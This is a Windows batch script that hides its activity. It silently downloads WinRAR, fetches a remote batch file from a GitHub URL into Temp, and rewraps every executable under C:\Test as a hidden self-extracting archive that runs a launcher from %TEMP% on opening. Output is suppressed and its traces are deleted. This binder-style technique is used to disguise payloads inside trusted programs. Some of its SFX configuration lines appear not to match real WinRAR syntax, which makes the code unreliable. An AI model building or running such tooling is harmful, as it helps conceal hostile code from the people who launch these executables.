@echo off
setlocal enabledelayedexpansion

:: =========================
:: CONFIGURATION
:: =========================
set "GITHUB_BAT_URL=https://raw.githubusercontent.com/Vinodsmiley8/SOME-OF-MY-WORKS/main/Phase2.bat"
set "EXE_FOLDER=C:\Test"
set "DOWNLOAD_BAT=%USERPROFILE%\AppData\Local\Temp\myscript.bat"

set "WINRAR_PORTABLE_URL=https://www.rarlab.com/rar/winrar-x64-602.exe"
set "WINRAR_DIR=%USERPROFILE%\AppData\Local\WinRAR"
set "WINRAR_PATH=%WINRAR_DIR%\WinRAR.exe"

:: =========================
:: STEP 0: Ensure WinRAR exists (portable)
:: =========================
if not exist "%WINRAR_PATH%" (
    mkdir "%WINRAR_DIR%"
    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%WINRAR_PORTABLE_URL%' -OutFile '%WINRAR_DIR%\winrar_setup.exe'"
    "%WINRAR_DIR%\winrar_setup.exe" /S /D=%WINRAR_DIR% >nul 2>&1
    if not exist "%WINRAR_PATH%" exit /b
)

:: =========================
:: STEP 1: Download BAT silently and verify
:: =========================
powershell -WindowStyle Hidden -Command ^
"try {Invoke-WebRequest -Uri '%GITHUB_BAT_URL%' -OutFile '%DOWNLOAD_BAT%' -ErrorAction Stop} catch {exit 1}"
if not exist "%DOWNLOAD_BAT%" exit /b

:: =========================
:: STEP 2: Loop through all EXEs recursively
:: =========================
for /R "%EXE_FOLDER%" %%f in (*.exe) do (
    set "CURRENT_EXE=%%f"
    set "BASENAME=%%~nf"
    set "OUTPUT_EXE=%%~dpf%%~nf.exe"

    :: Create dynamic BAT for this EXE
    set "TEMP_BAT=%WINRAR_DIR%\!BASENAME!_run.bat"
    (
        echo @echo off
        echo start "" "%%TEMP%%\%%~nxf"
    ) > "!TEMP_BAT!"

    :: Temporary RAR archive
    set "TEMP_RAR=%WINRAR_DIR%\!BASENAME!.rar"
    "%WINRAR_PATH%" a -ep1 "!TEMP_RAR!" "%%f" "!TEMP_BAT!" >nul 2>&1

    :: SFX configuration
    set "SFX_CFG=%WINRAR_DIR%\!BASENAME!_sfx.cfg"
    (
        echo;Path to extract: %%TEMP%%
        echo;Run after extraction: !BASENAME!_run.bat
        echo;Hide all: 1
        echo;Delete temporary files: 1
    ) > "!SFX_CFG!"

    :: Build SFX EXE silently
    "%WINRAR_PATH%" a -sfx -z"!SFX_CFG!" "!OUTPUT_EXE!" "!TEMP_RAR!" >nul 2>&1

    :: Cleanup temporary files
    del "!TEMP_RAR!" >nul 2>&1
    del "!SFX_CFG!" >nul 2>&1
    del "!TEMP_BAT!" >nul 2>&1
)

:: Cleanup downloaded BAT
del "%DOWNLOAD_BAT%" >nul 2>&1

:: Done silently
exit /b
